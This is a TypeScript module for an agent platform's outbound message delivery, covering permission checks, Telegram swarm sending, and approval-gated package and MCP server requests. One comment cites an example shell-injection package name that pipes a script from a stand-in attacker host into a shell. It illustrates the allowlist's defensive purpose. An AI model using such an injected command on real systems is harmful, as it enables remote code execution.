/**
 * Outbound message delivery.
 * Polls session outbound DBs for undelivered messages, delivers through channel adapters.
 *
 * Two-DB architecture:
 *   - Reads messages_out from outbound.db (container-owned, opened read-only)
 *   - Tracks delivery in inbound.db's `delivered` table (host-owned)
 *   - Never writes to outbound.db — preserves single-writer-per-file invariant
 */
import type Database from 'better-sqlite3';
import fs from 'fs';
import path from 'path';

import { GROUPS_DIR } from './config.js';
import { clearRoutesForAgentInGroup } from './db/active-agent-routes.js';
import {
  getRunningSessions,
  getActiveSessions,
  createPendingQuestion,
  getSession,
  createPendingApproval,
} from './db/sessions.js';
import { getAgentGroup, createAgentGroup, updateAgentGroup, getAgentGroupByFolder } from './db/agent-groups.js';
import { createDestination, getDestinationByName, hasDestination, normalizeName } from './db/agent-destinations.js';
import { getMessagingGroup, getMessagingGroupByPlatform } from './db/messaging-groups.js';
import { pickApprovalDelivery, pickApprover } from './access.js';
import {
  getDueOutboundMessages,
  getDeliveredIds,
  markDelivered,
  markDeliveryFailed,
  migrateDeliveredTable,
  insertTask,
  cancelTask,
  pauseTask,
  resumeTask,
} from './db/session-db.js';
import { log } from './log.js';
import { normalizeOptions, type RawOption } from './channels/ask-question.js';
import { sanitizeTelegramLegacyMarkdown } from './channels/telegram-markdown-sanitize.js';
import {
  openInboundDb,
  openOutboundDb,
  sessionDir,
  inboundDbPath,
  resolveSession,
  writeDestinations,
  writeSessionMessage,
  writeSystemResponse,
} from './session-manager.js';
import { resetContainerIdleTimer, wakeContainer } from './container-runner.js';
import { initGroupFilesystem } from './group-init.js';
import type { OutboundFile } from './channels/adapter.js';
import type { AgentGroup, Session } from './types.js';

const ACTIVE_POLL_MS = 1000;
const SWEEP_POLL_MS = 60_000;
const MAX_DELIVERY_ATTEMPTS = 3;

/** Track delivery attempt counts. Resets on process restart (gives failed messages a fresh chance). */
const deliveryAttempts = new Map<string, number>();

/**
 * Process-local in-flight tracker keyed by message ID. Prevents the active +
 * sweep pollers (or two near-simultaneous active iterations) from delivering
 * the same outbound row twice while the first attempt is mid-flight. Without
 * this, slow channel calls (e.g. swarm-mode HTTP to Telegram Bot API, ~200ms)
 * leave a window where the second poller reads the same `undelivered` row
 * before the first calls `markDelivered`.
 */
const inFlightMessages = new Set<string>();

export interface ChannelDeliveryAdapter {
  deliver(
    channelType: string,
    platformId: string,
    threadId: string | null,
    kind: string,
    content: string,
    files?: OutboundFile[],
  ): Promise<string | undefined>;
  setTyping?(channelType: string, platformId: string, threadId: string | null): Promise<void>;
}

let deliveryAdapter: ChannelDeliveryAdapter | null = null;
let activePolling = false;
let sweepPolling = false;

export function setDeliveryAdapter(adapter: ChannelDeliveryAdapter): void {
  deliveryAdapter = adapter;
}

/**
 * Deliver a system notification to an agent as a regular chat message.
 * Used for fire-and-forget responses from host actions (create_agent result,
 * approval outcomes, etc.). The agent sees it as an inbound chat message
 * with sender="system".
 */
function notifyAgent(session: Session, text: string): void {
  writeSessionMessage(session.agent_group_id, session.id, {
    id: `sys-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    kind: 'chat',
    timestamp: new Date().toISOString(),
    platformId: session.agent_group_id,
    channelType: 'agent',
    threadId: null,
    content: JSON.stringify({ text, sender: 'system', senderId: 'system' }),
  });
  // Wake the container so it picks up the notification promptly
  const fresh = getSession(session.id);
  if (fresh) {
    wakeContainer(fresh).catch((err) => log.error('Failed to wake container after notification', { err }));
  }
}

/**
 * Send an approval request to a privileged user's DM and record a
 * pending_approval row. Routing: admin @ originating agent group → owner.
 * Tie-break: prefer an approver reachable on the same channel kind as the
 * originating session's messaging group. Delivery always lands in the
 * approver's DM (not the origin group), regardless of where the action
 * was triggered.
 */
const APPROVAL_OPTIONS: RawOption[] = [
  { label: 'Approve', selectedLabel: '✅ Approved', value: 'approve' },
  { label: 'Reject', selectedLabel: '❌ Rejected', value: 'reject' },
];

async function requestApproval(
  session: Session,
  agentName: string,
  action: 'install_packages' | 'request_rebuild' | 'add_mcp_server',
  payload: Record<string, unknown>,
  title: string,
  question: string,
): Promise<void> {
  const approvers = pickApprover(session.agent_group_id);
  if (approvers.length === 0) {
    notifyAgent(session, `${action} failed: no owner or admin configured to approve.`);
    return;
  }

  // Origin channel kind drives the tie-break preference in approval delivery.
  const originChannelType = session.messaging_group_id
    ? (getMessagingGroup(session.messaging_group_id)?.channel_type ?? '')
    : '';

  const target = await pickApprovalDelivery(approvers, originChannelType);
  if (!target) {
    notifyAgent(session, `${action} failed: no DM channel found for any eligible approver.`);
    return;
  }

  const approvalId = `appr-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const normalizedOptions = normalizeOptions(APPROVAL_OPTIONS);
  createPendingApproval({
    approval_id: approvalId,
    session_id: session.id,
    request_id: approvalId, // fire-and-forget: no separate request id to correlate
    action,
    payload: JSON.stringify(payload),
    created_at: new Date().toISOString(),
    title,
    options_json: JSON.stringify(normalizedOptions),
  });

  if (deliveryAdapter) {
    try {
      await deliveryAdapter.deliver(
        target.messagingGroup.channel_type,
        target.messagingGroup.platform_id,
        null,
        'chat-sdk',
        JSON.stringify({
          type: 'ask_question',
          questionId: approvalId,
          title,
          question,
          options: APPROVAL_OPTIONS,
        }),
      );
    } catch (err) {
      log.error('Failed to deliver approval card', { action, approvalId, err });
      notifyAgent(session, `${action} failed: could not deliver approval request to ${target.userId}.`);
      return;
    }
  }

  log.info('Approval requested', { action, approvalId, agentName, approver: target.userId });
}

/** Show typing indicator on a channel. Called when a message is routed to the agent. */
export async function triggerTyping(channelType: string, platformId: string, threadId: string | null): Promise<void> {
  try {
    await deliveryAdapter?.setTyping?.(channelType, platformId, threadId);
  } catch {
    // Typing is best-effort — don't fail routing if it errors
  }
}

/** Start the active container poll loop (~1s). */
export function startActiveDeliveryPoll(): void {
  if (activePolling) return;
  activePolling = true;
  pollActive();
}

/** Start the sweep poll loop (~60s). */
export function startSweepDeliveryPoll(): void {
  if (sweepPolling) return;
  sweepPolling = true;
  pollSweep();
}

async function pollActive(): Promise<void> {
  if (!activePolling) return;

  try {
    const sessions = getRunningSessions();
    for (const session of sessions) {
      await deliverSessionMessages(session);
    }
  } catch (err) {
    log.error('Active delivery poll error', { err });
  }

  setTimeout(pollActive, ACTIVE_POLL_MS);
}

async function pollSweep(): Promise<void> {
  if (!sweepPolling) return;

  try {
    const sessions = getActiveSessions();
    for (const session of sessions) {
      await deliverSessionMessages(session);
    }
  } catch (err) {
    log.error('Sweep delivery poll error', { err });
  }

  setTimeout(pollSweep, SWEEP_POLL_MS);
}

async function deliverSessionMessages(session: Session): Promise<void> {
  const agentGroup = getAgentGroup(session.agent_group_id);
  if (!agentGroup) return;

  let outDb: Database.Database;
  let inDb: Database.Database;
  try {
    outDb = openOutboundDb(agentGroup.id, session.id);
    inDb = openInboundDb(agentGroup.id, session.id);
  } catch {
    return; // DBs might not exist yet
  }

  try {
    // Read all due messages from outbound.db (read-only)
    const allDue = getDueOutboundMessages(outDb);
    if (allDue.length === 0) return;

    // Filter out already-delivered messages using inbound.db's delivered table
    const delivered = getDeliveredIds(inDb);
    const undelivered = allDue.filter((m) => !delivered.has(m.id));
    if (undelivered.length === 0) return;

    // Ensure platform_message_id column exists (migration for existing sessions)
    migrateDeliveredTable(inDb);

    for (const msg of undelivered) {
      // Race guard: skip if another poller (active vs sweep, or overlapping
      // active iterations during a slow deliver) already started this msg.
      if (inFlightMessages.has(msg.id)) continue;
      inFlightMessages.add(msg.id);
      try {
        const platformMsgId = await deliverMessage(msg, session, inDb);
        markDelivered(inDb, msg.id, platformMsgId ?? null);
        deliveryAttempts.delete(msg.id);
        resetContainerIdleTimer(session.id);
      } catch (err) {
        const attempts = (deliveryAttempts.get(msg.id) ?? 0) + 1;
        deliveryAttempts.set(msg.id, attempts);
        if (attempts >= MAX_DELIVERY_ATTEMPTS) {
          log.error('Message delivery failed permanently, giving up', {
            messageId: msg.id,
            sessionId: session.id,
            attempts,
            err,
          });
          markDeliveryFailed(inDb, msg.id);
          deliveryAttempts.delete(msg.id);
        } else {
          log.warn('Message delivery failed, will retry', {
            messageId: msg.id,
            sessionId: session.id,
            attempt: attempts,
            maxAttempts: MAX_DELIVERY_ATTEMPTS,
            err,
          });
        }
      } finally {
        inFlightMessages.delete(msg.id);
      }
    }
  } finally {
    outDb.close();
    inDb.close();
  }
}

async function deliverMessage(
  msg: {
    id: string;
    kind: string;
    platform_id: string | null;
    channel_type: string | null;
    thread_id: string | null;
    content: string;
  },
  session: Session,
  inDb: Database.Database,
): Promise<string | undefined> {
  if (!deliveryAdapter) {
    log.warn('No delivery adapter configured, dropping message', { id: msg.id });
    return;
  }

  const content = JSON.parse(msg.content);

  // System actions — handle internally (schedule_task, cancel_task, etc.)
  if (msg.kind === 'system') {
    await handleSystemAction(content, session, inDb);
    return;
  }

  // Agent-to-agent — route to target session (with permission check).
  // Permission is enforced via agent_destinations — the source agent must have
  // a row for the target. Content is copied verbatim; the target's formatter
  // will look up the source agent in its own local map to display a name.
  if (msg.channel_type === 'agent') {
    const targetAgentGroupId = msg.platform_id;
    if (!targetAgentGroupId) {
      throw new Error(`agent-to-agent message ${msg.id} is missing a target agent group id`);
    }
    // Self-messages are always allowed — used for system notes injected back
    // into an agent's own session (e.g. post-approval follow-up prompts).
    if (
      targetAgentGroupId !== session.agent_group_id &&
      !hasDestination(session.agent_group_id, 'agent', targetAgentGroupId)
    ) {
      throw new Error(
        `unauthorized agent-to-agent: ${session.agent_group_id} has no destination for ${targetAgentGroupId}`,
      );
    }
    if (!getAgentGroup(targetAgentGroupId)) {
      throw new Error(`target agent group ${targetAgentGroupId} not found for message ${msg.id}`);
    }
    const { session: targetSession } = resolveSession(targetAgentGroupId, null, null, 'agent-shared');
    writeSessionMessage(targetAgentGroupId, targetSession.id, {
      id: `a2a-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      kind: 'chat',
      timestamp: new Date().toISOString(),
      platformId: session.agent_group_id,
      channelType: 'agent',
      threadId: null,
      content: msg.content,
    });
    log.info('Agent message routed', {
      from: session.agent_group_id,
      to: targetAgentGroupId,
      targetSession: targetSession.id,
    });
    const fresh = getSession(targetSession.id);
    if (fresh) await wakeContainer(fresh);
    return;
  }

  // Permission check: the source agent must be allowed to deliver to this
  // channel destination. Two ways it passes:
  //
  //   1. The target is the session's own origin chat (session.messaging_group_id
  //      matches). An agent can always reply to the chat it was spawned from;
  //      requiring a destinations row for the obvious case is a footgun.
  //
  //   2. Otherwise, the agent must have an explicit agent_destinations row
  //      targeting that messaging group. createMessagingGroupAgent() inserts
  //      these automatically when wiring, so an operator wiring additional
  //      chats to the agent doesn't need a separate ACL step.
  //
  // Failures throw — unlike a silent `return`, an Error falls into the retry
  // path in deliverSessionMessages and eventually marks the message as failed
  // (instead of marking it delivered when nothing was actually delivered,
  // which was the pre-refactor bug).
  if (msg.channel_type && msg.platform_id) {
    const mg = getMessagingGroupByPlatform(msg.channel_type, msg.platform_id);
    if (!mg) {
      throw new Error(`unknown messaging group for ${msg.channel_type}/${msg.platform_id} (message ${msg.id})`);
    }
    const isOriginChat = session.messaging_group_id === mg.id;
    if (!isOriginChat && !hasDestination(session.agent_group_id, 'channel', mg.id)) {
      throw new Error(
        `unauthorized channel destination: ${session.agent_group_id} cannot send to ${mg.channel_type}/${mg.platform_id}`,
      );
    }
  }

  // Track pending questions for ask_user_question flow
  if (content.type === 'ask_question' && content.questionId) {
    const title = content.title as string | undefined;
    const rawOptions = content.options as unknown;
    if (!title || !Array.isArray(rawOptions)) {
      log.error('ask_question missing required title/options — not persisting', {
        questionId: content.questionId,
      });
    } else {
      createPendingQuestion({
        question_id: content.questionId,
        session_id: session.id,
        message_out_id: msg.id,
        platform_id: msg.platform_id,
        channel_type: msg.channel_type,
        thread_id: msg.thread_id,
        title,
        options: normalizeOptions(rawOptions as never),
        created_at: new Date().toISOString(),
      });
      log.info('Pending question created', { questionId: content.questionId, sessionId: session.id });
    }
  }

  // Channel delivery
  if (!msg.channel_type || !msg.platform_id) {
    log.warn('Message missing routing fields', { id: msg.id });
    return;
  }

  // Read file attachments from outbox if the content declares files
  let files: OutboundFile[] | undefined;
  const outboxDir = path.join(sessionDir(session.agent_group_id, session.id), 'outbox', msg.id);
  if (Array.isArray(content.files) && content.files.length > 0 && fs.existsSync(outboxDir)) {
    files = [];
    for (const filename of content.files as string[]) {
      const filePath = path.join(outboxDir, filename);
      if (fs.existsSync(filePath)) {
        files.push({ filename, data: fs.readFileSync(filePath) });
      } else {
        log.warn('Outbox file not found', { messageId: msg.id, filename });
      }
    }
    if (files.length === 0) files = undefined;
  }

  // Sticky-exit marker: agents that participate in sticky routing can end
  // their own session by appending `[CAIO-EXIT]` to a message. We strip the
  // marker before delivering (the user shouldn't see it) and clear the
  // sticky route after successful delivery so the NEXT inbound goes back to
  // the fallback agent (usually Zory).
  const exitSignaled = detectExitMarker(content);
  const deliveredContent = exitSignaled ? stripExitMarker(msg.content, content) : msg.content;

  // Telegram swarm: if this agent has its own bot token in container_config,
  // deliver via the Telegram Bot API using that token so the message shows
  // up with the correct agent identity (avatar + @handle). Falls through to
  // the default chat-sdk-telegram adapter when no swarm token is configured.
  let platformMsgId: string | undefined;
  const swarmToken = msg.channel_type === 'telegram' ? getSwarmBotToken(session.agent_group_id) : null;
  if (swarmToken) {
    platformMsgId = await sendViaSwarmBot(swarmToken, msg.platform_id, msg.thread_id, deliveredContent, files);
  } else {
    platformMsgId = await deliveryAdapter.deliver(
      msg.channel_type,
      msg.platform_id,
      msg.thread_id,
      msg.kind,
      deliveredContent,
      files,
    );
  }
  log.info('Message delivered', {
    id: msg.id,
    channelType: msg.channel_type,
    platformId: msg.platform_id,
    platformMsgId,
    fileCount: files?.length,
    swarm: !!swarmToken,
  });

  if (exitSignaled) {
    const mg = getMessagingGroupByPlatform(msg.channel_type, msg.platform_id);
    if (mg) {
      const cleared = clearRoutesForAgentInGroup(mg.id, session.agent_group_id);
      log.info('Sticky route cleared after exit marker', {
        sessionId: session.id,
        agentGroup: session.agent_group_id,
        messagingGroup: mg.id,
        cleared,
      });
    }
  }

  // Clean up outbox directory after successful delivery
  if (fs.existsSync(outboxDir)) {
    fs.rmSync(outboxDir, { recursive: true, force: true });
  }

  return platformMsgId;
}

/**
 * Telegram swarm: per-agent bot token lookup. Reads
 * `agent_groups.container_config.telegramBotToken` for the agent that owns
 * this session. Returns null if the agent has no swarm token configured —
 * in that case delivery falls back to the default chat-sdk-telegram adapter.
 */
function getSwarmBotToken(agentGroupId: string): string | null {
  const agentGroup = getAgentGroup(agentGroupId);
  if (!agentGroup?.container_config) return null;
  try {
    const cfg = JSON.parse(agentGroup.container_config) as { telegramBotToken?: unknown };
    return typeof cfg.telegramBotToken === 'string' && cfg.telegramBotToken ? cfg.telegramBotToken : null;
  } catch {
    return null;
  }
}

/**
 * Send a message through the Telegram Bot API using a specific agent's bot
 * token. Used by the swarm flow so different agents appear as different bot
 * identities in the same chat.
 *
 * Supports text + photos + documents. Reply keyboards, edits, and reactions
 * still go through the chat-sdk path (no agent-identity requirement there).
 */
async function sendViaSwarmBot(
  botToken: string,
  platformId: string,
  threadId: string | null,
  contentJson: string,
  files: OutboundFile[] | undefined,
): Promise<string | undefined> {
  const content = JSON.parse(contentJson) as Record<string, unknown>;
  const rawText = typeof content.text === 'string' ? content.text : '';
  // Strip markdown so Telegram's parser never rejects with
  // "can't parse entities". Plain text is reliable; rich formatting flows
  // via attachments. See src/channels/telegram-markdown-sanitize.ts.
  const text = sanitizeTelegramLegacyMarkdown(rawText);

  // Telegram chat_id is the numeric chat id. Our platform_id may carry a
  // "telegram:" namespace prefix (same convention as WhatsApp). Strip it.
  const chatId = platformId.startsWith('telegram:') ? platformId.slice('telegram:'.length) : platformId;
  const api = `https://api.telegram.org/bot${botToken}`;

  // Forum topic support: Telegram supergroups with topics require
  // `message_thread_id` on every send so the message lands in the right
  // topic instead of the general chat. Accept either a bare numeric string
  // ("2") or chat-sdk's composite "chatId:threadId" encoding.
  const messageThreadId = parseThreadId(threadId);

  const baseBody: Record<string, unknown> = { chat_id: chatId };
  if (messageThreadId !== null) baseBody.message_thread_id = messageThreadId;

  if (!files || files.length === 0) {
    // Plain text, no parse_mode — the sanitizer already stripped Markdown.
    const res = await fetch(`${api}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ...baseBody, text: text || ' ' }),
    });
    const body = (await res.json()) as { ok: boolean; result?: { message_id: number }; description?: string };
    if (!body.ok) throw new Error(`Telegram sendMessage failed: ${body.description ?? res.status}`);
    return body.result ? String(body.result.message_id) : undefined;
  }

  // Files present: use sendPhoto for images (captioned with text on the first
  // one), sendDocument for everything else. Multiple attachments → multiple
  // calls; first carries the caption, rest are captionless.
  let firstMsgId: string | undefined;
  for (let i = 0; i < files.length; i++) {
    const f = files[i];
    const isImage = /\.(png|jpe?g|webp|gif)$/i.test(f.filename);
    const endpoint = isImage ? 'sendPhoto' : 'sendDocument';
    const form = new FormData();
    form.set('chat_id', chatId);
    if (messageThreadId !== null) form.set('message_thread_id', String(messageThreadId));
    if (i === 0 && text) form.set('caption', text);
    form.set(isImage ? 'photo' : 'document', new Blob([new Uint8Array(f.data)]), f.filename);
    const res = await fetch(`${api}/${endpoint}`, { method: 'POST', body: form });
    const body = (await res.json()) as { ok: boolean; result?: { message_id: number }; description?: string };
    if (!body.ok) throw new Error(`Telegram ${endpoint} failed: ${body.description ?? res.status}`);
    if (i === 0 && body.result) firstMsgId = String(body.result.message_id);
  }
  return firstMsgId;
}

function parseThreadId(threadId: string | null): number | null {
  if (!threadId) return null;
  // chat-sdk encoding may be "chatId:threadId" — take the right side.
  const raw = threadId.includes(':') ? threadId.split(':').pop()! : threadId;
  const n = Number(raw);
  return Number.isFinite(n) && n > 0 ? n : null;
}

/** True if message text contains the literal `[CAIO-EXIT]` marker. */
function detectExitMarker(content: Record<string, unknown>): boolean {
  const text = typeof content.text === 'string' ? content.text : '';
  return text.includes('[CAIO-EXIT]');
}

/**
 * Return a version of the JSON content with `[CAIO-EXIT]` stripped from the
 * `text` field. Preserves all other fields verbatim. Tolerates trailing
 * whitespace around the marker.
 */
function stripExitMarker(rawContent: string, parsedContent: Record<string, unknown>): string {
  const text = typeof parsedContent.text === 'string' ? parsedContent.text : '';
  const stripped = text
    .replace(/\s*\[CAIO-EXIT\]\s*$/g, '')
    .replace(/\[CAIO-EXIT\]/g, '')
    .trimEnd();
  const patched = { ...parsedContent, text: stripped };
  try {
    return JSON.stringify(patched);
  } catch {
    return rawContent; // shouldn't happen — parsedContent came from JSON.parse
  }
}

/**
 * Handle system actions from the container agent.
 * These are written to messages_out because the container can't write to inbound.db.
 * The host applies them to inbound.db here.
 */
async function handleSystemAction(
  content: Record<string, unknown>,
  session: Session,
  inDb: Database.Database,
): Promise<void> {
  const action = content.action as string;
  log.info('System action from agent', { sessionId: session.id, action });

  switch (action) {
    case 'schedule_task': {
      const taskId = content.taskId as string;
      const prompt = content.prompt as string;
      const script = content.script as string | null;
      const processAfter = content.processAfter as string;
      const recurrence = (content.recurrence as string) || null;

      insertTask(inDb, {
        id: taskId,
        processAfter,
        recurrence,
        platformId: (content.platformId as string) ?? null,
        channelType: (content.channelType as string) ?? null,
        threadId: (content.threadId as string) ?? null,
        content: JSON.stringify({ prompt, script }),
      });
      log.info('Scheduled task created', { taskId, processAfter, recurrence });
      break;
    }

    case 'cancel_task': {
      const taskId = content.taskId as string;
      cancelTask(inDb, taskId);
      log.info('Task cancelled', { taskId });
      break;
    }

    case 'pause_task': {
      const taskId = content.taskId as string;
      pauseTask(inDb, taskId);
      log.info('Task paused', { taskId });
      break;
    }

    case 'resume_task': {
      const taskId = content.taskId as string;
      resumeTask(inDb, taskId);
      log.info('Task resumed', { taskId });
      break;
    }

    case 'create_agent': {
      const requestId = content.requestId as string;
      const name = content.name as string;
      const instructions = content.instructions as string | null;

      const sourceGroup = getAgentGroup(session.agent_group_id);
      if (!sourceGroup) {
        notifyAgent(session, `create_agent failed: source agent group not found.`);
        log.warn('create_agent failed: missing source group', { sessionAgentGroup: session.agent_group_id, name });
        break;
      }

      const localName = normalizeName(name);

      // Collision in the creator's destination namespace
      if (getDestinationByName(sourceGroup.id, localName)) {
        notifyAgent(session, `Cannot create agent "${name}": you already have a destination named "${localName}".`);
        break;
      }

      // Derive a safe folder name, deduplicated globally across agent_groups.folder
      let folder = localName;
      let suffix = 2;
      while (getAgentGroupByFolder(folder)) {
        folder = `${localName}-${suffix}`;
        suffix++;
      }

      const groupPath = path.join(GROUPS_DIR, folder);
      const resolvedPath = path.resolve(groupPath);
      const resolvedGroupsDir = path.resolve(GROUPS_DIR);
      if (!resolvedPath.startsWith(resolvedGroupsDir + path.sep)) {
        notifyAgent(session, `Cannot create agent "${name}": invalid folder path.`);
        log.error('create_agent path traversal attempt', { folder, resolvedPath });
        break;
      }

      const agentGroupId = `ag-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
      const now = new Date().toISOString();

      const newGroup: AgentGroup = {
        id: agentGroupId,
        name,
        folder,
        agent_provider: null,
        container_config: null,
        created_at: now,
      };
      createAgentGroup(newGroup);
      initGroupFilesystem(newGroup, { instructions: instructions ?? undefined });

      // Insert bidirectional destination rows (= ACL grants).
      // Creator refers to child by the name it chose; child refers to creator as "parent".
      createDestination({
        agent_group_id: sourceGroup.id,
        local_name: localName,
        target_type: 'agent',
        target_id: agentGroupId,
        created_at: now,
      });
      // Handle the unlikely case where the child already has a "parent" destination
      // (shouldn't happen for a brand-new agent, but be safe).
      let parentName = 'parent';
      let parentSuffix = 2;
      while (getDestinationByName(agentGroupId, parentName)) {
        parentName = `parent-${parentSuffix}`;
        parentSuffix++;
      }
      createDestination({
        agent_group_id: agentGroupId,
        local_name: parentName,
        target_type: 'agent',
        target_id: sourceGroup.id,
        created_at: now,
      });

      // Refresh the creator's destination map so the new child appears
      // immediately on the next query — no restart needed.
      writeDestinations(session.agent_group_id, session.id);

      // Fire-and-forget notification back to the creator
      notifyAgent(
        session,
        `Agent "${localName}" created. You can now message it with <message to="${localName}">...</message>.`,
      );
      log.info('Agent group created', { agentGroupId, name, localName, folder, parent: sourceGroup.id });
      // Note: requestId is unused — this is fire-and-forget, not request/response.
      void requestId;
      break;
    }

    case 'add_mcp_server': {
      const agentGroup = getAgentGroup(session.agent_group_id);
      if (!agentGroup) {
        notifyAgent(session, 'add_mcp_server failed: agent group not found.');
        break;
      }
      const serverName = content.name as string;
      const command = content.command as string;
      if (!serverName || !command) {
        notifyAgent(session, 'add_mcp_server failed: name and command are required.');
        break;
      }
      await requestApproval(
        session,
        agentGroup.name,
        'add_mcp_server',
        {
          name: serverName,
          command,
          args: (content.args as string[]) || [],
          env: (content.env as Record<string, string>) || {},
        },
        'Add MCP Request',
        `Agent "${agentGroup.name}" is attempting to add a new MCP server:\n${serverName} (${command})`,
      );
      break;
    }

    case 'install_packages': {
      const agentGroup = getAgentGroup(session.agent_group_id);
      if (!agentGroup) {
        notifyAgent(session, 'install_packages failed: agent group not found.');
        break;
      }

      const apt = (content.apt as string[]) || [];
      const npm = (content.npm as string[]) || [];
      const reason = (content.reason as string) || '';

      // Host-side sanitization (defense in depth — container should validate first).
      // Strict allowlist: Debian/npm naming rules only. Blocks shell injection via
      // package names like `vim; curl evil.com | sh`.
      const APT_RE = /^[a-z0-9][a-z0-9._+-]*$/;
      const NPM_RE = /^(@[a-z0-9][a-z0-9._-]*\/)?[a-z0-9][a-z0-9._-]*$/;
      const MAX_PACKAGES = 20;
      if (apt.length + npm.length === 0) {
        notifyAgent(session, 'install_packages failed: at least one apt or npm package is required.');
        break;
      }
      if (apt.length + npm.length > MAX_PACKAGES) {
        notifyAgent(session, `install_packages failed: max ${MAX_PACKAGES} packages per request.`);
        break;
      }
      const invalidApt = apt.find((p) => !APT_RE.test(p));
      if (invalidApt) {
        notifyAgent(session, `install_packages failed: invalid apt package name "${invalidApt}".`);
        log.warn('install_packages: invalid apt package rejected', { pkg: invalidApt });
        break;
      }
      const invalidNpm = npm.find((p) => !NPM_RE.test(p));
      if (invalidNpm) {
        notifyAgent(session, `install_packages failed: invalid npm package name "${invalidNpm}".`);
        log.warn('install_packages: invalid npm package rejected', { pkg: invalidNpm });
        break;
      }

      const packageList = [...apt.map((p) => `apt: ${p}`), ...npm.map((p) => `npm: ${p}`)].join(', ');
      await requestApproval(
        session,
        agentGroup.name,
        'install_packages',
        { apt, npm, reason },
        'Install Packages Request',
        `Agent "${agentGroup.name}" is attempting to install a package + rebuild container:\n${packageList}${reason ? `\nReason: ${reason}` : ''}`,
      );
      break;
    }

    case 'request_rebuild': {
      const agentGroup = getAgentGroup(session.agent_group_id);
      if (!agentGroup) {
        notifyAgent(session, 'request_rebuild failed: agent group not found.');
        break;
      }
      const reason = (content.reason as string) || '';
      await requestApproval(
        session,
        agentGroup.name,
        'request_rebuild',
        { reason },
        'Rebuild Request',
        `Agent "${agentGroup.name}" is attempting to rebuild container.${reason ? `\nReason: ${reason}` : ''}`,
      );
      break;
    }

    case 'request_credential': {
      const { handleCredentialRequest } = await import('./credentials.js');
      await handleCredentialRequest(content, session);
      break;
    }

    default:
      log.warn('Unknown system action', { action });
  }
}

export function stopDeliveryPolls(): void {
  activePolling = false;
  sweepPolling = false;
}
